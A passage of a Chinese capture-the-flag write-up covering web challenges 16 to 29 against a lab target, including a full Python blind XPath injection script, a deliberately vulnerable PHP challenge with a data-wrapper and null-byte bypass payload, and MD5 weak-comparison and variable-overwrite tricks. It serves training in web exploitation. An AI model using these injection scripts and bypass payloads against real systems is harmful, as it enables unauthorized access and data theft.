</p><p>或者，我们可以又这么理解一下，正因为PHP5的对象的独特性，对象在任何地方被调用，都是引用地址型的，所以相对消耗的资源会少一点。在其它页面为它赋值时是直接修改，而不是引用一个拷贝。 </p><p>例如： </p><p>$user &#x3D; new stdClass(); </p><p>$user-&gt;name &#x3D; ‘gouki’; </p><p>$myUser &#x3D; $user; </p><p>$myUser-&gt;name &#x3D; ‘flypig’; </p><p>向这种题目，就可以使用stdClass类，利用PHP的特性。 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213831343.png" alt="image-20241024213831343"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213840875.png" alt="image-20241024213840875"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213848988.png" alt="image-20241024213848988"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213859301.png" alt="image-20241024213859301"></p><h2 id="16、WEB-easy-injection-wc"><a href="#16、WEB-easy-injection-wc" class="headerlink" title="16、WEB_easy_injection_wc"></a>16、WEB_easy_injection_wc</h2><p>这里提示，查看源码发现base64编码内容，解码后发现是?id&#x3D;，判断为sql注入， </p><p>但是使用普通的and不行，判断是其他类型的注入，这里 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213918313.png" alt="image-20241024213918313"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213922112.png" alt="image-20241024213922112"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213927179.png" alt="image-20241024213927179"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213933192.png" alt="image-20241024213933192"></p><p>后端代码 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024213943424.png" alt="image-20241024213943424"></p><p>It_is_funny_14354223.xml内容 </p><p>这里xpath注入，而且没有回显什么的，不知道这个注入方式会不会显错，直接找现成的payload直接用 </p><p>这道题目是盲注，所以需要写脚本 </p><p>这里参考了大佬的文章 <a href="https://copyfuture.com/blogs-details/202206110044038396#XPATH_1">https://copyfuture.com/blogs-details/202206110044038396#XPATH_1</a> </p><p>本地备份：[xpath注入](onenote:<a href="https://d.docs.live.net/5fd9226643f52715/%E6%96%87%E6%A1%A3/%E6%B6%B5%E8%BE%89">https://d.docs.live.net/5fd9226643f52715/文档/涵辉</a> 的笔记本&#x2F;微信保存.one#Xpath注入&amp;section-id&#x3D;{0AEE60AF-B9E0-4B55-AEEF-4D89B851138C}&amp;page-id&#x3D;{2FFF92E5-097E-472A-8845-EAB7BA7ADF2A}&amp;end) </p><p>然后 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214030014.png" alt="image-20241024214030014"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214036645.png" alt="image-20241024214036645"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214050275.png" alt="image-20241024214050275"></p><p>脚本模块 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214104407.png" alt="image-20241024214104407"></p><p>猜根名 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214115629.png" alt="image-20241024214115629"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214127139.png" alt="image-20241024214127139"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>gjd = <span class="hljs-number">0</span><br><span class="hljs-comment"># 跟节点数量和长度</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    url1 = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    url2 = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    payload1 = <span class="hljs-string">&quot;&#x27;or count(/)=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>    payload2 = <span class="hljs-string">&quot;&#x27;or string-length(name(/*[1]))=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;and &#x27;&#x27;=&#x27;&quot;</span><br>    url1 += payload1<br>    url2 += payload2<br>    a = requests.get(url=url1)<br>    b = requests.get(url=url2)<br>    <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;根节点有<span class="hljs-subst">&#123;i&#125;</span>个&quot;</span>)<br>    <span class="hljs-keyword">if</span> b.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        gjd = i<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;根节点长度有<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment"># 根名</span><br>a = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm&#x27;</span><br>genName = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, gjd + <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>        url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>        payload = <span class="hljs-string">&quot;&#x27;or substring(name(/*), &quot;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot;, 1)=&#x27;&quot;</span> + i + <span class="hljs-string">&quot;&#x27; and &#x27;&#x27;=&#x27;&quot;</span><br>        url += payload<br>        b = requests.get(url=url)<br>        <span class="hljs-keyword">if</span> b.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>            genName += i<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;根节点名称为<span class="hljs-subst">&#123;genName&#125;</span>&quot;</span>)<br><span class="hljs-comment"># 根子节点数量</span><br>zi = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    payload = <span class="hljs-string">&quot;&#x27; or count(/&quot;</span> + genName + <span class="hljs-string">&quot;/*)=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>    url += payload<br>    a = requests.get(url=url)<br>    <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;根子节点数量<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        zi = i<br><span class="hljs-comment"># 根节点子节点的长度和名称</span><br>a2 = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm&#x27;</span><br>mc1 = <span class="hljs-string">&quot;&quot;</span><br>mc2 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, zi + <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):<br>        url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>        payload = <span class="hljs-string">&quot;&#x27; or string-length(name(/&quot;</span> + genName + <span class="hljs-string">&quot;/*[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;]))= &quot;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>        url += payload<br>        a = requests.get(url=url)<br>        <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;genName&#125;</span>的第<span class="hljs-subst">&#123;i&#125;</span>个子节点长度为<span class="hljs-subst">&#123;j&#125;</span>&quot;</span>)<br>            <span class="hljs-comment"># for ii in range(1, zi + 1):</span><br>            <span class="hljs-comment">#     for jj in range(1, j + 1):</span><br>            <span class="hljs-comment">#         for l in a2:</span><br>            <span class="hljs-comment">#             url = &quot;http://192.168.1.200:52580/?id=&quot;</span><br>            <span class="hljs-comment">#             payload = &quot;&#x27; or substring(name(/main/*[&quot; + str(ii) + &quot;]),&quot; + str(jj) + &quot;,1)=&#x27;&quot; + str(l) + &quot;&#x27; and &#x27;&#x27;=&#x27;&quot;</span><br>            <span class="hljs-comment">#             url += payload</span><br>            <span class="hljs-comment">#             b = requests.get(url=url)</span><br>            <span class="hljs-comment">#             if b.text.find(&quot;good&quot;) &gt;= 1:</span><br>            <span class="hljs-comment">#                 print(l, end=&quot;&quot;)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第一个子节点名称为：user，第二个子节点名称为ctf&quot;</span>)<br>ctf = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    payload = <span class="hljs-string">&quot;&#x27; or string-length(name(/main/ctf/*[1]))=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>    url += payload<br>    a = requests.get(url=url)<br>    <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ctf第一个子节点长度为<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>        ctf = i<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>):<br>            a = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm&#x27;</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> a:<br>                url1 = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>                payload = <span class="hljs-string">&quot;&#x27; or substring(name(/main/ctf/*[2]),&quot;</span> + <span class="hljs-built_in">str</span>(ii) + <span class="hljs-string">&quot;,1)=&#x27;&quot;</span> + <span class="hljs-built_in">str</span>(jj) + <span class="hljs-string">&quot;&#x27; and &#x27;&#x27;=&#x27;&quot;</span><br>                <span class="hljs-comment"># 这里的main还有另一个参数，为username,ctf/*[1]</span><br>                url1 += payload<br>                a2 = requests.get(url=url1)<br>                <span class="hljs-keyword">if</span> a2.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(jj, end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-comment"># http://192.168.1.200:52580/?id=&#x27; or count(/main/ctf[1]/username/*)=0 and &#x27;&#x27;=&#x27;</span><br><span class="hljs-comment"># 验证/main/的ctf中的username是否还有子节点，=0为无</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    url = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>    payload = <span class="hljs-string">&quot;&#x27; or string-length(/main/ctf[1]/username[1])=&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; and &#x27;&#x27;=&#x27;&quot;</span><br>    url += payload<br>    a = requests.get(url=url)<br>    <span class="hljs-keyword">if</span> a.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>        a1 = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm-.&#123;&#125;0123456789&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>            <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> a1:<br>                url1 = <span class="hljs-string">&quot;http://192.168.1.200:52580/?id=&quot;</span><br>                payload = <span class="hljs-string">&quot;&#x27; or substring((/main/ctf[1]/key[1]),&quot;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot;,1)=&#x27;&quot;</span> + <span class="hljs-built_in">str</span>(ii) + <span class="hljs-string">&quot;&#x27; and &#x27;&#x27;=&#x27;&quot;</span><br>                url1 += payload<br>                b = requests.get(url=url1)<br>                <span class="hljs-keyword">if</span> b.text.find(<span class="hljs-string">&quot;good&quot;</span>) &gt;= <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(ii, end=<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></div></td></tr></table></figure><h2 id="17、WEB-luckynumber"><a href="#17、WEB-luckynumber" class="headerlink" title="17、WEB_luckynumber"></a>17、WEB_luckynumber</h2><p>这里有3页，结合标题的lucknumber，猜数字，直接拿burp跑就行了 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214236552.png" alt="image-20241024214236552"></p><h2 id="18、WEB-bestphp"><a href="#18、WEB-bestphp" class="headerlink" title="18、WEB_bestphp"></a>18、WEB_bestphp</h2><p>3位大于999的字符串，科学计数法 <img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214255481.png" alt="image-20241024214255481"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214301028.png" alt="image-20241024214301028"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214310266.png" alt="image-20241024214310266"></p><h2 id="19、WEB-robots"><a href="#19、WEB-robots" class="headerlink" title="19、WEB_robots"></a>19、WEB_robots</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214335166.png" alt="image-20241024214335166"></p><p>这题吃了没文化的亏，卡半天 ，不过 这题目也挺离谱的哈哈哈哈</p><p>猜robots.php </p><p>瞎做 </p><p>useraget中添加GOOGLEBOT出现flag </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214350042.png" alt="image-20241024214350042"></p><h2 id="20、WEB-pilipili"><a href="#20、WEB-pilipili" class="headerlink" title="20、WEB_pilipili"></a>20、WEB_pilipili</h2><p>进去也没法右键，ctrl+U打开源码，看到一个可疑JS文件，JS的eval加密，直接上在线平台解密，解出来flag错的。。还是靶机问题 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214423013.png" alt="image-20241024214423013"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214429880.png" alt="image-20241024214429880"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214437978.png" alt="image-20241024214437978"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214446037.png" alt="image-20241024214446037"></p><h2 id="21、WEB-welcome"><a href="#21、WEB-welcome" class="headerlink" title="21、WEB_welcome"></a>21、WEB_welcome</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214522971.png" alt="image-20241024214522971"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214529391.png" alt="image-20241024214529391"></p><p>打开404，头文件藏着，但是flag在这个靶场试错的，flag在&#x2F;目录 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214551289.png" alt="image-20241024214551289"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214600445.png" alt="image-20241024214600445"></p><h2 id="22、WEB-login-form"><a href="#22、WEB-login-form" class="headerlink" title="22、WEB_login_form"></a>22、WEB_login_form</h2><p>前边啥也没有，看看源码 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214621259.png" alt="image-20241024214621259"></p><p>图片base64，解开是flag，但是提交错误。。 bug估计</p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214632124.png" alt="image-20241024214632124"></p><h2 id="23、WEB-code"><a href="#23、WEB-code" class="headerlink" title="23、WEB_code"></a>23、WEB_code</h2><p>直接逆向 </p><p>echo hex2bin(strrev(bin2hex(base64_decode(“”)))); </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214703545.png" alt="image-20241024214703545"></p><h2 id="24、WEB-workhard"><a href="#24、WEB-workhard" class="headerlink" title="24、WEB_workhard"></a>24、WEB_workhard</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214718998.png" alt="image-20241024214718998"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214726641.png" alt="image-20241024214726641"></p><p>题目代码</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>echo &quot;&lt;!--challenge3.txt--&gt;&quot;;<br>require __DIR__.&#x27;/lib.php&#x27;;<br>if(!$_GET[&#x27;id&#x27;])<br>&#123;<br>    header(&#x27;Location: challenge3.php?id=1&#x27;);<br>    exit();<br>&#125;<br>$id=$_GET[&#x27;id&#x27;];<br>$a=$_GET[&#x27;a&#x27;];<br>$b=$_GET[&#x27;b&#x27;];<br>if(stripos($a,&#x27;.&#x27;))<br>&#123;<br>    echo &#x27;Hahahahahaha&#x27;;<br>    return ;<br>&#125;<br>$data = @file_get_contents($a,&#x27;r&#x27;);<br>if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)<br>&#123;<br>    echo $flag;<br>&#125;<br>else<br>&#123;<br>    print &quot;work harder!harder!harder!&quot;;<br>&#125;<br><br>?&gt;<br><br></code></pre></div></td></tr></table></figure><p>data要等于指定字符串，id要等于0，长度要大于5，eregi检查是否存在指定内容，截取b的第一位拼接111是否在1114，截取b的第一位不能等于4 </p><p>data可以用data伪协议或者php伪协议的input，post传值 </p><p>id等于0，因为get直接传递字符型会被转为string类型，所以这里直接用string类型，弱类型比较就是0 </p><p>b的长度大于5，后面两个substr，直接%00绕过 </p><p>Payload </p><p>?id&#x3D;zhh&amp;data&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,xxx&amp;%00llllll </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214850175.png" alt="image-20241024214850175"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214901291.png" alt="image-20241024214901291"></p><h2 id="25、WEB-randnum"><a href="#25、WEB-randnum" class="headerlink" title="25、WEB_randnum"></a>25、WEB_randnum</h2><p>这里要大于5,184,000，也要小于7,776,000，如果输入太大的数，有个sleep，科学计数法 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214925010.png" alt="image-20241024214925010"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214931121.png" alt="image-20241024214931121"></p><p>等待6秒即可</p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024214941515.png" alt="image-20241024214941515"></p><h2 id="26、WEB-login-md5"><a href="#26、WEB-login-md5" class="headerlink" title="26、WEB_login_md5"></a>26、WEB_login_md5</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215354621.png" alt="image-20241024215354621"></p><h2 id="27、WEB-mark-wc"><a href="#27、WEB-mark-wc" class="headerlink" title="27、WEB_mark_wc"></a>27、WEB_mark_wc</h2><p>git泄露 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215435738.png" alt="image-20241024215435738"></p><p>查看代码，$$，变量覆盖， </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215445919.png" alt="image-20241024215445919"></p><h2 id="28、web-md5-wc"><a href="#28、web-md5-wc" class="headerlink" title="28、web_md5_wc"></a>28、web_md5_wc</h2><p>ffifdyop绕过</p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215512802.png" alt="image-20241024215512802"></p><p>2，直接查看源码，可以看到MD5弱类型，数组绕过后查看下一关 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215540379.png" alt="image-20241024215540379"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215547119.png" alt="image-20241024215547119"></p><p>这一关也是弱类型，直接数组绕过 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215603216.png" alt="image-20241024215603216"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215613767.png" alt="image-20241024215613767"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215623359.png" alt="image-20241024215623359"></p><h2 id="29、web-bugsbunny"><a href="#29、web-bugsbunny" class="headerlink" title="29、web_bugsbunny"></a>29、web_bugsbunny</h2><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215645366.png" alt="image-20241024215645366"></p><p>又是变量覆盖，直接使用die函数，输出flag，这里需要post随便flag随便传个值绕过第二个if判断 </p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215658740.png" alt="image-20241024215658740"></p><p><img src="/2024/10/24/%E7%A5%9E%E5%B7%9E%E6%95%B0%E7%A0%81DCFW-1800CTF%E9%A2%98%E7%9B%AEwp/image-20241024215704216.png" 